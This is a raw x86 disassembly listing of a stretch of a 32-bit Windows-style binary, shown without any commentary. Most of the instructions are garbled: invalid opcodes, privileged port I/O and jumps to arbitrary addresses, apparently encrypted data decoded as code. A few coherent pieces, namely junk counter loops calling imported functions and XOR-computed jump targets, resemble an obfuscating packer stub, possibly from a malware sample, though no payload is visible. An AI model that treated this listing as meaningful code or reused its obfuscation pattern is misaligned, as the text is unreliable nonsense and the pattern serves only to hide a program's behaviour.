  40720d:	add    al,bl
  40720f:	call   0xac3:0x255a2f4c
  407216:	retf   
  407217:	mov    esp,0x12632d03
  40721c:	mov    eax,ds:0x750d40cc
  407221:	and    eax,0x95fe73db
  407226:	in     eax,0x3e
  407228:	dec    ebx
  407229:	jle    0x4071da
  40722b:	xchg   edx,eax
  40722c:	mov    dl,0x72
  40722e:	mov    ds:0xddfafff7,al
  407233:	in     eax,dx
  407234:	jmp    0x4b18ad0d
  407239:	cmc    
  40723a:	pop    eax
  40723b:	jnp    0x40729d
  40723d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40723e:	mov    WORD PTR [edi],ds
  407240:	or     DWORD PTR [edi+0x3f],0x78
  407244:	and    esp,DWORD PTR [ecx+0x1bcc331c]
  40724a:	push   es
  40724b:	call   0xbd92:0xe402274f
  407252:	rcl    ecx,1
  407254:	inc    ebp
  407255:	jnp    0x40722b
  407257:	add    dl,BYTE PTR [edi]
  407259:	bound  ebp,QWORD PTR [eax+0x66abb2d7]
  40725f:	call   0xbd17:0x2bfe9e8a
  407266:	push   ebp
  407267:	loope  0x40721d
  407269:	inc    eax
  40726a:	mov    al,BYTE PTR [esi]
  40726c:	inc    esi
  40726d:	clc    
  40726e:	std    
  40726f:	pop    edx
  407270:	inc    ecx
  407271:	pop    bp
  407273:	sub    al,0x21
  407275:	dec    eax
  407276:	out    dx,eax
  407277:	mov    dh,0x5c
  407279:	add    DWORD PTR [edi+0x131b1a69],edi
  40727f:	and    eax,0x1ac1609d
  407284:	xlat   BYTE PTR ds:[ebx]
  407285:	jl     0x4072d4
  407287:	adc    eax,0x636a887
  40728c:	sub    BYTE PTR fs:[ecx-0x411d153b],al
  407293:	add    ah,BYTE PTR [edx]
  407295:	push   cs
  407296:	adc    dh,BYTE PTR [eax+0x6aba0dd5]
  40729c:	les    ecx,FWORD PTR [ecx-0x5f]
  40729f:	sbb    eax,0x88e92b84
  4072a4:	cs inc ecx
  4072a6:	sub    BYTE PTR [edi],dl
  4072a8:	fcom   DWORD PTR gs:[ecx]
  4072ab:	retf   
  4072ac:	add    ebp,edi
  4072ae:	jne    0x40731d
  4072b0:	jns    0x407244
  4072b2:	repz push 0xffffffc1
  4072b5:	sbb    bh,BYTE PTR [ecx+0x3f71eef9]
  4072bb:	popa   
  4072bc:	push   esp
  4072bd:	mov    al,0xf9
  4072bf:	add    DWORD PTR [ebx+0x5d8be055],ecx
  4072c5:	clc    
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0x1a900f0c
  4072e9:	jecxz  0x4072d0
  4072eb:	clc    
  4072ec:	sbb    BYTE PTR [esi+0x7e],bh
  4072ef:	and    edi,DWORD PTR [edi+0x7e]
  4072f2:	jle    0x407276
  4072f4:	push   ebx
  4072f5:	out    dx,al
  4072f6:	pop    ebx
  4072f7:	push   es
  4072f8:	pop    ebp
  4072f9:	push   ss
  4072fa:	shl    eax,0xb5
  4072fd:	pop    ds
  4072fe:	mov    ecx,0x878237b0
  407303:	mov    cl,0xe5
  407305:	adc    eax,0x8f752e5e
  40730a:	add    eax,0xd8a30eef
  40730f:	mov    dh,0x39
  407311:	lea    ebp,[ecx+0xcb34dc2]
  407317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407318:	lds    esi,FWORD PTR [edx+0x45]
  40731b:	dec    ecx
  40731c:	popf   
  40731d:	or     edx,ebx
  40731f:	mov    esi,0xbe07b06b
  407324:	adc    eax,0x128a918e
  407329:	ins    DWORD PTR es:[edi],dx
  40732a:	inc    ecx
  40732b:	scas   eax,DWORD PTR es:[edi]
  40732c:	mov    edi,0x35cd70a4
  407331:	(bad)
  407335:	call   0x618d57ee
  40733a:	imul   ebp,DWORD PTR [ecx+0x64],0xfffffffc
  40733e:	sub    cl,ah
  407340:	fsub   DWORD PTR [esi]
  407342:	(bad)  
  407343:	pushf  
  407344:	xchg   esi,eax
  407345:	inc    edi
  407346:	mov    esp,0xae350579
  40734b:	imul   edi,DWORD PTR [edx+ecx*1],0x66be9f3a
  407352:	outs   dx,BYTE PTR ds:[esi]
  407353:	les    ebx,FWORD PTR [esi+0x1a]
  407356:	jae    0x4073cd
  407358:	push   ds
  407359:	pop    ss
  40735a:	aad    0x21
  40735c:	sbb    al,0x88
  40735e:	mov    ah,0xdd
  407360:	xchg   ebx,eax
  407361:	sub    ch,ah
  407363:	ss dec ebx
  407365:	test   al,0x38
  407367:	push   ss
  407368:	pusha  
  407369:	shl    DWORD PTR [esi],1
  40736b:	pop    ecx
  40736c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40736d:	fdiv   st,st(0)
  40736f:	and    BYTE PTR [esi],dl
  407371:	jmp    0xebfa:0x7c391f54
  407378:	out    dx,eax
  407379:	data16 sub BYTE PTR [edx],dh
  40737c:	pop    ss
  40737d:	ret    
  40737e:	test   BYTE PTR [edi-0x2ced4fa7],al
  407384:	int3   
  407385:	(bad)  
  407386:	xlat   BYTE PTR ds:[ebx]
  407387:	jmp    0x2dba:0xfcaa69e4
  40738e:	sub    eax,edx
  407390:	and    ebp,DWORD PTR [eax+0x72]
  407393:	fdiv   QWORD PTR [esi+edi*2-0xf]
  407397:	int3   
  407398:	clc    
  407399:	mov    al,0x4
  40739b:	sbb    BYTE PTR [edi+0x6ca3e26e],cl
  4073a1:	push   edx
  4073a2:	pop    esp
  4073a3:	xchg   BYTE PTR [ebx],cl
  4073a5:	xchg   edx,eax
  4073a6:	stc    
  4073a7:	and    edi,DWORD PTR [edx-0x7fd06406]
  4073ad:	fisubr DWORD PTR ds:[esi+0x95a90cf]
  4073b4:	and    DWORD PTR [edx-0x190ec13b],edi
  4073ba:	sbb    DWORD PTR gs:[edx+eiz*2-0x62],0xffffffd0
  4073c0:	in     al,0xa4
  4073c2:	jecxz  0x40734a
  4073c4:	jns    0x40742d
  4073c6:	mov    bh,0xad
  4073c8:	jmp    0xf980340c
  4073cd:	cli    
  4073ce:	jne    0x407435
  4073d0:	sbb    BYTE PTR [edx+0x4c],0xc9
  4073d4:	adc    esp,DWORD PTR [ebx+0x57f3b98a]
  4073da:	jo     0x4073b5
  4073dc:	pushf  
  4073dd:	mov    eax,ds:0x7944eafd
  4073e2:	add    dh,BYTE PTR [edx]
  4073e4:	xchg   esi,eax
  4073e5:	push   ebx
  4073e6:	std    
  4073e7:	sbb    DWORD PTR [ebp+0x37fca9a2],edx
  4073ed:	dec    ecx
  4073ee:	xlat   BYTE PTR ds:[ebx]
  4073ef:	or     esi,DWORD PTR [edi+0x78ab12de]
  4073f5:	pop    ebx
  4073f6:	rcr    BYTE PTR [eax],cl
  4073f8:	or     ecx,DWORD PTR [eax-0xf]
  4073fb:	ins    DWORD PTR es:[edi],dx
  4073fc:	retf   
  4073fd:	xchg   esp,eax
  4073fe:	pop    ebp
  4073ff:	fwait
  407400:	push   edx
  407401:	mov    dh,0xc8
  407403:	jp     0x407475
  407405:	test   eax,0x82b62ce4
  40740a:	push   edx
  40740b:	push   esi
  40740c:	add    dl,BYTE PTR [edi-0x4e]
  40740f:	dec    edi
  407410:	xor    eax,esp
  407412:	stos   BYTE PTR es:[edi],al
  407413:	dec    edx
  407414:	inc    ebx
  407415:	test   al,0x45
  407417:	lock std 
  407419:	rcr    BYTE PTR [edx],1
  40741b:	rcr    BYTE PTR [edi+eiz*2+0x4c54690d],0xc5
  407423:	loop   0x407472
  407425:	test   DWORD PTR [eax-0x3d36a0de],0x8b550008
  40742f:	in     al,dx
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1-0x3c39d801],edi
  407443:	repnz push edx
  407445:	lods   eax,DWORD PTR ds:[esi]
  407446:	sbb    DWORD PTR [esi+0x7e],edi
  407449:	jmp    0x92bef2cd
  40744e:	jbe    0x4073d2
  407450:	arpl   WORD PTR [edi+0x70],dx
  407453:	pop    esi
  407454:	shr    DWORD PTR [esi+0x3e],cl
  407457:	ffreep st(5)
  407459:	hlt    
  40745a:	cli    
  40745b:	add    eax,0x67741e9e
  407460:	ins    DWORD PTR es:[edi],dx
  407461:	push   esi
  407462:	push   ebx
  407463:	clc    
  407464:	pop    ss
  407465:	mov    dl,BYTE PTR [ebp+0x7]
  407468:	add    al,0x99
  40746a:	jnp    0x407461
  40746c:	out    dx,eax
  40746d:	iret   
  40746e:	out    0x5,eax
  407470:	lock push ebx
  407472:	lea    edx,[eax]
  407474:	popa   
  407475:	mov    eax,0x25af23a7
  40747a:	bnd jns 0x40747a
  40747d:	xor    BYTE PTR [esi],0xbf
  407480:	stos   DWORD PTR es:[edi],eax
  407481:	clc    
  407482:	in     al,0xc8
  407484:	shl    BYTE PTR [edi],0xab
  407487:	bound  eax,QWORD PTR [edi+0x54]
  40748a:	push   edi
  40748b:	xor    al,0x73
  40748d:	sahf   
  40748e:	cmc    
  40748f:	xchg   DWORD PTR [ebx+0x10],edx
  407492:	ret    
  407493:	fadd   QWORD PTR [ebx-0x6884307d]
  407499:	mov    cl,0xa3
  40749b:	add    DWORD PTR [eax],0x40
  40749e:	enter  0xf167,0xdb
  4074a2:	mov    ah,0xc8
  4074a4:	sahf   
  4074a5:	mov    al,ds:0xa334dd63
  4074aa:	dec    ebx
  4074ab:	loope  0x40750b
  4074ad:	mov    cl,0x90
  4074af:	add    BYTE PTR [eax+0x1a423bee],dh
  4074b5:	ror    DWORD PTR [ecx-0x4f9ab6e],cl
  4074bb:	test   eax,0x39c3c450
  4074c0:	sbb    esp,DWORD PTR [esi+0x53]
  4074c3:	js     0x4074a3
  4074c5:	pop    ss
  4074c6:	and    edx,DWORD PTR [edi+0x24]
  4074c9:	clc    
  4074ca:	aaa    
  4074cb:	in     eax,dx
  4074cc:	and    DWORD PTR [esi-0x54],0xd143bcda
  4074d3:	fadd   DWORD PTR [edi]
  4074d5:	cmp    BYTE PTR ds:0x70709d42,bl
  4074db:	out    0x57,eax
  4074dd:	add    al,0x66
  4074df:	and    edx,DWORD PTR [edi-0x49]
  4074e2:	ror    dl,1
  4074e4:	rcl    BYTE PTR ds:0x3ee1f8cf,cl
  4074ea:	sub    al,0x4d
  4074ec:	and    BYTE PTR [edx+0x738ef5b2],dh
  4074f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074f3:	cwde   
  4074f4:	test   al,0x1e
  4074f6:	pop    ds
  4074f7:	dec    ecx
  4074f8:	push   eax
  4074f9:	test   ch,bl
  4074fb:	call   0x399ad8b4
  407500:	addr16 inc eax
  407502:	push   es
  407503:	mov    ebx,0x594d57c5
  407508:	pushf  
  407509:	imul   edi,DWORD PTR [edi+0x35],0x1863557e
  407510:	push   cs
  407511:	xor    al,BYTE PTR [ebx]
  407513:	stos   DWORD PTR es:[edi],eax
  407514:	aas    
  407515:	repz adc ax,0x730c
  40751a:	mov    edx,0x87f5feed
  40751f:	enter  0xf923,0x2e
  407523:	mov    eax,ds:0x6432fff4
  407528:	repz fstp QWORD PTR [esi+0xf]
  40752c:	add    bh,BYTE PTR [ecx-0x32c36562]
  407532:	inc    ebp
  407533:	adc    edx,ecx
  407535:	ins    BYTE PTR es:[edi],dx
  407536:	mov    al,BYTE PTR [eax]
  407538:	sub    eax,0xfe58e1ab
  40753d:	jne    0x407519
  40753f:	mov    DWORD PTR [edx],ebp
  407541:	mov    ds:0x6e8b1c0b,eax
  407546:	adc    BYTE PTR [ecx+ebx*8-0xd40f18a],ah
  40754d:	mov    ebx,0x94bddb0e
  407552:	leave  
  407553:	sub    eax,eax
  407555:	sbb    ecx,DWORD PTR [eax-0x49e2124c]
  40755b:	pop    esi
  40755c:	into   
  40755d:	clc    
  40755e:	inc    esp
  40755f:	(bad)  
  407560:	mov    bl,0x8a
  407562:	jo     0x40750e
  407564:	dec    esi
  407565:	shl    DWORD PTR [edx+edx*4],0xec
  407569:	cmp    ebx,ebp
  40756b:	call   0x6963:0x6d92531c
  407572:	mov    BYTE PTR [edx+0x74],ah
  407575:	int    0xa2
  407577:	cmp    DWORD PTR [ecx-0x78],esp
  40757a:	mov    ch,0x7f
  40757c:	xchg   esi,eax
  40757d:	mov    ah,0xf0
  40757f:	inc    esi
  407580:	and    ebx,DWORD PTR ds:0xa3a34a6d
  407586:	xor    ebx,DWORD PTR [esi+0x4cdd27dd]
  40758c:	in     al,dx
  40758d:	jl     0x40760c
  40758f:	ja     0x4075e2
  407591:	pop    esi
  407592:	popf   
  407593:	push   ds
  407594:	sub    dl,BYTE PTR [edx]
  407596:	loope  0x4075f9
  407598:	or     ch,ah
  40759a:	sbb    DWORD PTR [esi+ebp*1],0x4f
  40759e:	out    0xc2,eax
  4075a0:	mov    dl,cl
  4075a2:	xchg   esi,eax
  4075a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075a4:	xchg   esp,eax
  4075a5:	inc    ecx
  4075a6:	(bad)
  4075a9:	sbb    esp,DWORD PTR [eax]
  4075ab:	jp     0x40757a
  4075ad:	adc    bl,ah
  4075af:	and    BYTE PTR [edx-0xd],ch
  4075b2:	sbb    eax,0x99b53d1c
  4075b7:	jge    0x4075fc
  4075b9:	sub    eax,0x51512fa9
  4075be:	and    DWORD PTR ds:0x41abce,0x0
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi+0x1e]
  4076f9:	cmp    dl,bh
  4076fb:	add    eax,0x7e7e1f1c
  407700:	jmp    0xccbef584
  407705:	aas    
  407706:	push   esi
  407707:	dec    edx
  407708:	mov    cl,0x4f
  40770a:	or     eax,0xf62850bc
  40770f:	iret   
  407710:	leave  
  407711:	dec    edi
  407712:	cmp    DWORD PTR [esi],eax
  407714:	xor    ebp,DWORD PTR [ebp+0x466ebc2d]
  40771a:	outs   dx,DWORD PTR ds:[esi]
  40771b:	pop    ebp
  40771c:	out    dx,eax
  40771d:	ss int 0x1
  407720:	push   eax
  407721:	sbb    BYTE PTR [esi-0x78d85614],dl
  407727:	add    eax,edx
  407729:	mov    esi,0x53d3ee14
  40772e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40772f:	sbb    al,0xd9
  407731:	push   cs
  407732:	mov    esp,0xe4dcbe9
  407737:	fwait
  407738:	pop    ebp
  407739:	dec    eax
  40773a:	int3   
  40773b:	mov    ds:0x84cf38ad,al
  407740:	icebp  
  407741:	cmp    al,0xc9
  407743:	push   cx
  407745:	pop    esi
  407746:	shl    ah,0x47
  407749:	int3   
  40774a:	dec    eax
  40774b:	dec    ebx
  40774c:	test   eax,0x50897f1e
  407751:	loope  0x407748
  407753:	lods   eax,DWORD PTR ds:[esi]
  407754:	mov    DWORD PTR [esi+0x31d0b627],0x3ddd4d17
  40775e:	add    al,0xa5
  407760:	pop    eax
  407761:	aas    
  407762:	xchg   esp,eax
  407763:	inc    ecx
  407764:	and    dl,al
  407766:	cmp    BYTE PTR [eax+0x5b],ah
  407769:	and    ebx,DWORD PTR [edx-0x1f1d7f18]
  40776f:	jbe    0x4076fe
  407771:	aad    0xa6
  407773:	push   0xb21ef2f
  407778:	data16 fmul QWORD PTR [eax-0x528f67f1]
  40777f:	and    eax,0x4a2343d5
  407784:	gs or  al,0xbe
  407787:	sbb    BYTE PTR [esi],bh
  407789:	call   0xfe98a6b7
  40778e:	clc    
  40778f:	ins    BYTE PTR es:[edi],dx
  407790:	out    0xeb,al
  407792:	inc    esi
  407793:	pop    ds
  407794:	or     bl,BYTE PTR [ecx-0x61]
  407797:	aam    0x60
  407799:	in     eax,dx
  40779a:	jge    0x40772d
  40779c:	mov    ebp,0xc739eac9
  4077a1:	mov    dl,BYTE PTR [esi+0x2f]
  4077a4:	jbe    0x4077d0
  4077a6:	ss add eax,0xb35013b0
  4077ac:	sub    al,0xd4
  4077ae:	fst    st(5)
  4077b0:	adc    al,0xd
  4077b2:	fidivr WORD PTR [edi-0x62ecabae]
  4077b8:	inc    esi
  4077b9:	outs   dx,BYTE PTR ds:[esi]
  4077ba:	rcr    BYTE PTR [ecx],0xdb
  4077bd:	retf   
  4077be:	xor    BYTE PTR [ecx+0x3f],cl
  4077c1:	push   0x96b7bb8b
  4077c6:	aas    
  4077c7:	cli    
  4077c8:	je     0x40776b
  4077ca:	test   bh,dl
  4077cc:	test   al,0x24
  4077ce:	loop   0x407820
  4077d0:	mov    ah,al
  4077d2:	enter  0x1eb4,0xa8
  4077d6:	mov    DWORD PTR [ebp-0x60f6cac2],0xf114e2bc
  4077e0:	sub    eax,DWORD PTR [edx+0x4ed1f094]
  4077e6:	fiadd  DWORD PTR [ebx-0x1e6842dd]
  4077ec:	js     0x407808
  4077ee:	xchg   BYTE PTR [edx-0x5c12ac27],bl
  4077f4:	enter  0x572b,0x6d
  4077f8:	and    eax,0x2cc90499
  4077fd:	pop    ds
  4077fe:	cmp    ch,BYTE PTR [bx+di+0x6c7f]
  407803:	ds and eax,0x2f18b303
  407809:	adc    eax,0xff54a80d
  40780e:	fwait
  40780f:	push   edi
  407810:	jno    0x407811
  407812:	sub    bl,BYTE PTR [ebp+0x31]
  407815:	adc    DWORD PTR [edi],edx
  407817:	pop    ss
  407818:	stos   DWORD PTR es:[edi],eax
  407819:	pushf  
  40781a:	jle    0x40780a
  40781c:	cli    
  40781d:	xchg   ebx,eax
  40781e:	test   al,0x86
  407820:	dec    ecx
  407821:	inc    edi
  407822:	je     0x40786c
  407824:	jl     0x407876
  407826:	(bad)  
  407827:	sbb    eax,0xe72ba6eb
  40782c:	pusha  
  40782d:	or     edx,DWORD PTR [ecx]
  40782f:	ret    0xbbf3
  407832:	mov    ebp,0x2ba38479
  407837:	outs   dx,BYTE PTR ds:[esi]
  407838:	mov    BYTE PTR [eax+ebp*2+0x369d711],dl
  40783f:	xor    eax,0x5728edac
  407844:	xchg   BYTE PTR [edi],ch
  407846:	jge    0x40787f
  407848:	pop    esi
  407849:	xor    DWORD PTR [edi+0x10],ecx
  40784c:	in     eax,0x41
  40784e:	test   BYTE PTR [eax],ch
  407850:	fcomp  st(1)
  407852:	xor    ecx,DWORD PTR [edx-0x15c13bb2]
  407858:	add    eax,0xef0fe5cc
  40785d:	sar    edi,1
  40785f:	xor    edx,DWORD PTR [edi+0x30]
  407862:	adc    eax,0x556fa227
  407867:	mov    al,ds:0xe8d6eb51
  40786c:	push   0xffffffae
  40786e:	cmp    eax,0x6f57a691
  407873:	je     0x407c04
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi+0x26afc68c],0xffffff87
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x40781e
  407897:	retf   0x8f87
  40789a:	push   0x12
  40789c:	out    0xb4,al
  40789e:	sbb    eax,DWORD PTR [ebx+0x752aad31]
  4078a4:	xchg   edx,eax
  4078a5:	ret    0x1bb9
  4078a8:	xchg   esi,eax
  4078a9:	rcr    BYTE PTR cs:[esi-0x39],1
  4078ad:	es repnz sub al,0x93
  4078b1:	loop   0x4078c7
  4078b3:	push   edx
  4078b4:	mov    bh,0xd4
  4078b6:	lods   eax,DWORD PTR ds:[esi]
  4078b7:	ret    0x625d
  4078ba:	and    al,0xe5
  4078bc:	(bad)  
  4078bd:	pop    eax
  4078be:	sub    DWORD PTR [ecx+0x59d454d2],0x8b8fc594
  4078c8:	cs movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078cb:	xchg   DWORD PTR [esi-0x695002ed],esp
  4078d1:	enter  0x9188,0x34
  4078d5:	bound  ebx,QWORD PTR [edx-0x3dce8bb6]
  4078db:	dec    ebp
  4078dc:	in     al,dx
  4078dd:	(bad)  
  4078de:	pop    eax
  4078df:	jne    0x4078c6
  4078e1:	arpl   bx,sp
  4078e3:	cmp    al,0x17
  4078e5:	test   bh,0x4f
  4078e8:	bound  edx,QWORD PTR [edi]
  4078ea:	arpl   WORD PTR [edx+0x5f],ax
  4078ed:	pop    edi
  4078ee:	or     esi,0xa852c101
  4078f4:	out    0x16,eax
  4078f6:	(bad)  
  4078f7:	pop    DWORD PTR [edi-0x5af8fac0]
  4078fd:	pop    esp
  4078fe:	jae    0x407906
  407900:	xlat   BYTE PTR fs:[ebx]
  407902:	jbe    0x4078f6
  407904:	pop    esp
  407905:	jecxz  0x40792b
  407907:	int3   
  407908:	mov    bl,0xba
  40790a:	dec    esp
  40790b:	lea    esp,[ecx]
  40790d:	aas    
  40790e:	lods   eax,DWORD PTR ds:[esi]
  40790f:	dec    eax
  407910:	add    DWORD PTR [edx+0x59],esp
  407913:	cmp    eax,DWORD PTR [edx+0x7b]
  407916:	push   esi
  407917:	jne    0x4078e4
  407919:	jae    0x407943
  40791b:	aad    0xfa
  40791d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40791e:	jle    0x4078ce
  407920:	push   ss
  407921:	push   edi
  407922:	mov    DWORD PTR [eax+0x46],ebx
  407925:	mov    fs,edx
  407927:	jge    0x407904
  407929:	jns    0x40796e
  40792b:	in     al,dx
  40792c:	lgdtd  [ebx-0x6d]
  407930:	pop    edx
  407931:	shl    BYTE PTR ds:0x743b0142,0xbe
  407938:	out    dx,eax
  407939:	xchg   esi,eax
  40793a:	jge    0x4079b8
  40793c:	fisubr DWORD PTR ds:0x27566559
  407942:	mov    esp,0x92ebf99b
  407947:	pop    esp
  407948:	imul   edi,ecx,0x67
  40794b:	cmc    
  40794c:	sar    ebp,cl
  40794e:	fldenv [eax]
  407950:	mov    dh,0xf3
  407952:	sub    DWORD PTR [edx],esp
  407954:	bound  ecx,QWORD PTR [edi-0x2f]
  407957:	pop    edi
  407958:	inc    esi
  407959:	arpl   WORD PTR [ebx],dx
  40795b:	sti    
  40795c:	ja     0x407975
  40795e:	ret    
  40795f:	push   ecx
  407960:	loop   0x4079db
  407962:	daa    
  407963:	imul   ebx,DWORD PTR [esi-0x18],0x3326c760
  40796a:	test   eax,0x45c6426a
  40796f:	push   eax
  407970:	and    esp,0xe2dc028c
  407976:	xchg   ebp,eax
  407977:	out    dx,eax
  407978:	xlat   BYTE PTR ds:[ebx]
  407979:	stos   DWORD PTR es:[edi],eax
  40797a:	sbb    ch,al
  40797c:	sbb    BYTE PTR [ecx],ah
  40797e:	xchg   edi,eax
  40797f:	imul   edx,esi,0xe8b84090
  407985:	push   0xffffffc5
  407987:	xchg   ebp,eax
  407988:	push   ebx
  407989:	jbe    0x407958
  40798b:	mov    ds:0x2910cff5,al
  407990:	cmc    
  407991:	(bad)  [edi-0x6f53b7c7]
  407997:	lahf   
  407998:	aam    0x81
  40799a:	inc    BYTE PTR [ebx]
  40799c:	mov    ch,0xc3
  40799e:	cdq    
  40799f:	out    0xd9,eax
  4079a1:	mov    si,0x884b
  4079a5:	leave  
  4079a6:	rcr    DWORD PTR [eax-0x60],cl
  4079a9:	and    eax,0x757f3153
  4079ae:	mov    gs,WORD PTR [edx]
  4079b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079b1:	popa   
  4079b2:	xor    eax,0x7aa5acee
  4079b7:	add    ecx,DWORD PTR [ecx-0x2d]
  4079ba:	fidiv  DWORD PTR [eax]
  4079bc:	sahf   
  4079bd:	sbb    DWORD PTR [edx-0x49339508],edx
  4079c3:	xchg   ebp,eax
  4079c4:	(bad)  
  4079c5:	cli    
  4079c6:	in     al,0xd9
  4079c8:	xor    DWORD PTR [ecx+0x4],0x66da3a1
  4079cf:	loop   0x40798f
  4079d1:	out    dx,al
  4079d2:	and    al,0xa2
  4079d4:	sub    eax,0x91213e5f
  4079d9:	mov    bh,0x2e
  4079db:	push   0xfffffff4
  4079dd:	and    eax,0xa15bac40
  4079e2:	inc    ebx
  4079e3:	lods   eax,DWORD PTR ds:[esi]
  4079e4:	xchg   edx,eax
  4079e5:	bound  eax,QWORD PTR [edx+0x1e]
  4079e8:	push   ds
  4079e9:	jno    0x4079bf
  4079eb:	dec    edx
  4079ec:	test   al,0xb8
  4079ee:	add    ecx,edx
  4079f0:	imul   esp,DWORD PTR [ebp+0x46f1870],0x12cbe3f9
  4079fa:	jmp    0x4079e2
  4079fc:	xchg   ebp,eax
  4079fd:	imul   edx,edi,0xc6048a34
  407a03:	mov    ecx,0xf8558b36
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx-0x1],0xea
  407a27:	int3   
  407a28:	push   esp
  407a29:	jle    0x407a3d
  407a2b:	jle    0x407aab
  407a2d:	jmp    0x33bef8b1
  407a32:	js     0x4079d7
  407a34:	mov    ecx,0xa28bb29a
  407a39:	sub    DWORD PTR [edi],ecx
  407a3b:	(bad)  
  407a3c:	out    dx,eax
  407a3d:	(bad)  
  407a3e:	lahf   
  407a3f:	outs   dx,DWORD PTR ds:[esi]
  407a40:	jl     0x4079f9
  407a42:	mov    ebx,0xad68847
  407a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a48:	fsubr  DWORD PTR [esi]
  407a4a:	sub    BYTE PTR [ebx-0x7c2114ef],ch
  407a50:	aam    0xa1
  407a52:	dec    esp
  407a53:	xchg   BYTE PTR [edi-0x4],bl
  407a56:	jno    0x407a49
  407a58:	mov    dh,0x9d
  407a5a:	adc    al,0x4c
  407a5c:	out    0x9,eax
  407a5e:	mov    esi,0x1916081a
  407a63:	or     eax,0x3c70036
  407a68:	in     eax,dx
  407a69:	xchg   ebp,eax
  407a6b:	sar    DWORD PTR [eax],0xea
  407a6e:	mov    ecx,0x2e8fe556
  407a73:	mov    eax,ds:0x40e9766c
  407a78:	fdiv   DWORD PTR ds:0xfdc94632
  407a7e:	dec    ebp
  407a7f:	mov    ebp,0x4984a2e0
  407a84:	pop    ss
  407a85:	xchg   edx,eax
  407a86:	jbe    0x407aa0
  407a88:	or     edx,esp
  407a8a:	shl    DWORD PTR [ebp-0x2dcfd413],0xe4
  407a91:	or     DWORD PTR [ebx+eax*2],ebp
  407a94:	rcl    BYTE PTR [esi-0x2e8f8e04],cl
  407a9a:	repnz lods ax,WORD PTR ds:[esi]
  407a9d:	sub    BYTE PTR gs:[ebp+0x42bd4671],ah
  407aa4:	scas   eax,DWORD PTR es:[edi]
  407aa5:	add    al,0x7c
